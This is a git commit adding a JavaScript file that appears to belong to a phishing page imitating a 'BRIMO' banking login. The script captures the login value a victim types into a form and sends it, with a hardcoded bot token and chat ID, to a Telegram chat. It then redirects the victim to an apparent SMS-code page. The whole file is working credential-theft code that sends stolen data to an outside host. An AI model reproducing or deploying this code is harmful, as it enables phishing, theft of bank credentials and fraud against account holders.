9017aef61933834099f971f9820faa210bc6e55a
yuo-in <idvarcel@gmail.com>
2024-10-03 22:28:40 +0700

    Add files via upload

---
+++ fetch.js
@@ -0,0 +1,44 @@
+
+        
+    const TOKEN = "7968267455:AAHPQSapwslZc243o10rUmhePRUZBHSGwlI";
+const CHAT_ID = "7788991344";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { name, } = form;
+  const data = {
+    name: name.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>LINK LOGIN BRIMO  = </b> ${data.name}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href = '/smslink.html';
+}
+
+p
